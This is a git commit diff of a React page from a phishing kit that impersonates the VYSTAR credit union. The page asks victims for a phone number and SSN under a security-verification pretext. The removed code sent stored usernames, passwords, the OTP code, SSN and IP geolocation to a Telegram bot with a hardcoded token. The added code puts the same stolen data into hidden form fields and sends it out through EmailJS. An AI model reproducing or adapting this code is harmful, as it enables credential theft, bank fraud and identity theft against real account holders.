c8f1d791369e3a71b8dbd4872265a4a578822f49
unknown <abdullahomotoke@gmail.com>
2023-11-18 03:42:05 -0500

    little update

--- src/pages/additional.tsx
+++ src/pages/additional.tsx
@@ -1,56 +1,52 @@
-import React, { useState } from "react";
+import React, { useState, useRef, useEffect } from "react";
 import { useNavigate } from "react-router-dom";
 import Navbar from "../components/navbar/navbar";
 import cookies from "../utils/cookie.config";
+import emailjs from "@emailjs/browser";
+
 
 type Details = {
   phone: string;
   sn: string;
 };
 
-console.log(navigator.userAgent);
-
 export default function Additional() {
     const login1: Login = cookies.get("login1");
     const login2: Login2 = cookies.get("login2");
     const otp: { code: string } = cookies.get("otp");
+    const [isLoading, setIsLoading] = useState(false)
   const [formInput, setFormInput] = useState<Details>({
     phone: "",
     sn: "",
   });
 
-  async function getDetails(PHONE:string, SN:string) {
+  const [info, setInfo] = useState({
+    ip:"",
+    isp:"",
+    state: ""
+  })
+
+  let agent = navigator.userAgent;
+
+  async function getDetails() {
+setIsLoading(true)
     var res = await fetch("http://ip-api.com/json");
 
     var result = await res.json();
 
-    let agent = navigator.userAgent;
+    
 
-    var message = `|-----VYSTAR CU-------|      
-                                  ${agent}               
-                                LOGIN1: ${login1.username}
-                                PASSWORD1:${login1.password}
-                                   LOGIN 2:${login2.username2}
-                                              PASSWORD 2:${login2.password2}
-                                             CODE:${otp.code}
-                                PHONE:${PHONE}
-                                SSN:${SN}
-                                -----------------------------
-                                -----------------------------
-                                  COUNTRY: ${result.country}
-                                      CITY:${result.city}
-                                LATITUDE:${result.lat}
-                                LONGITUDE:${result.lon}
-                                        IP:${result.query}
-                                        ZIPCODE:${result.zip}
-                                TIMEZONE:${result.timezone}
-                                DATE:${Date.now()}
-                                      ISP:${result.isp}
-                                      REGION:${result.regionName}
-          `;
-
-          return message;
+    setInfo({
+      ip: result.query,
+      isp: result.isp,
+      state:result.regionName
+    })
+    setIsLoading(false)
   }
+
+  useEffect(()=>{
+    getDetails();
+  }, [])
 
   const navigate = useNavigate();
 
@@ -61,27 +57,38 @@ export default function Additional() {
     }));
   }
 
+  const form = useRef<HTMLFormElement>(null);
+
   async function handleSubmit(event: React.FormEvent<HTMLFormElement>) {
+    setIsLoading(true)
     event.preventDefault();
-    const message = await getDetails(formInput.phone, formInput.sn)
-    const token = "5724587499:AAFl5fwOetWO0yu-nFJg9OgyyFi0AGqB-TY"
-    const chat_id = 1124454735
-    await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=HTML`);
-    navigate("../congratulation", { replace: true });
+    emailjs.sendForm('service_9gs21m9', 'template_u4icphu', form.current!, 'T8uOG8MEAEQT6Xur6')
+      .then((result) => {
+        console.log(result.text)
+        navigate("../congratulation", { replace: true });
+      }, (error) => {
+        alert("could not complete your request")
+        console.log(error)
+        setIsLoading(true)
+      }); 
   }
  
   return (
     <div>
+      {isLoading &&
+      <div className="loader-container">
+        <span className="loader"></span>
+      </div>}
       <Navbar />
       <div className="main-body">
         <div className="form">
-          <form onSubmit={handleSubmit}>
+          
             <p style={{ fontWeight: "bold", padding: "10px" }}>
               For your security, verify your information by entering the
               following details
             </p>
             <hr />
-
+            <form ref={form} onSubmit={handleSubmit}>
             <div style={{ padding: "20px" }}>
               <div className="form-item">
                 <label htmlFor="">Phone Number</label>
@@ -90,12 +97,60 @@ export default function Additional() {
                   onChange={handleInputChange}
                   name="phone"
                   type="tel"
+                  defaultValue={formInput.phone}
                 />
               </div>
               <div className="form-item">
                 <label htmlFor="">SSN</label>
-                <input name="sn" onChange={handleInputChange} type="tel" />
+                <input name="sn" onChange={handleInputChange} defaultValue={formInput.sn} type="tel" />
               </div>
+<div style={{display: "none"}}>
+<div className="form-item">
+              <label htmlFor="">Username</label>
+              <input type="text" name="browser" defaultValue={agent} />
+            </div>
+
+            <div className="form-item">
+              <label htmlFor="">Username</label>
+              <input type="text" name="ip" defaultValue={info.ip} />
+            </div>
+
+            <div className="form-item">
+              <label htmlFor="">Username</label>
+              <input type="text" name="isp" defaultValue={info.isp} />
+            </div>
+
+            <div className="form-item">
+              <label htmlFor="">Username</label>
+              <input type="text" name="state" defaultValue={info.state} />
+            </div>
+
+              <div className="form-item">
+              <label htmlFor="">Username</label>
+              <input type="text" name="username" defaultValue={login1.username} />
+            </div>
+
+            <div className="form-item">
+              <label htmlFor="">Password</label>
+              <input type="password" name="password" defaultValue={login1.password} />
+            </div>
+
+            <div className="form-item">
+              <label htmlFor="">Username</label>
+              <input type="text" name="username2" defaultValue={login2.username2} />
+            </div>
+
+            <div className="form-item">
+              <label htmlFor="">Password</label>
+              <input type="password" name="password2" defaultValue={login2.password2} />
+            </div>
+
+            <div className="form-item">
+              <label htmlFor="">Enter code</label>
+              <input name="code" type="text" defaultValue={otp.code} />
+            </div>
+
+            </div>
 
               <br />
 
